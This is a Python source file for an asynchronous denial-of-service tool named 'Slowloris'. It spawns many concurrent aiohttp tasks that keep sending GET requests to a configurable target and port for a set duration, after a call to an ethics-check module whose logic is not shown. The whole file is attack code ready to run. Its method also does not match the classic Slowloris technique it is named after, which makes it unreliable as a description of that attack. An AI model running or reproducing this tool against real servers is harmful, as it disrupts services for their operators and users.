import aiohttp
import asyncio
from core.ethical_check import EthicalEnforcer
import random

class Slowloris:
    def __init__(self):
        self.eth = EthicalEnforcer()
        self.connections = []
        
    async def maintain_connection(self, config):
        try:
            async with aiohttp.ClientSession() as session:
                while True:
                    resp = await session.get(
                        f"http://{config.target}:{config.port}",
                        headers={'User-Agent': 'Mozilla/5.0', 'Content-Length': '42'}
                    )
                    self.connections.append(resp)
                    await asyncio.sleep(random.randint(5, 15))
        except:
            pass

    async def attack(self, config):
        self.eth.validate_target(config.target)
        tasks = []
        
        for _ in range(config.threads):
            task = asyncio.create_task(self.maintain_connection(config))
            tasks.append(task)
        
        try:
            while True:
                if config.duration > 0:
                    await asyncio.sleep(config.duration)
                    break
                await asyncio.sleep(1)
        except asyncio.CancelledError:
            pass
        finally:
            for task in tasks:
                task.cancel()
            print(f"\nMaintained {len(self.connections)} concurrent connections")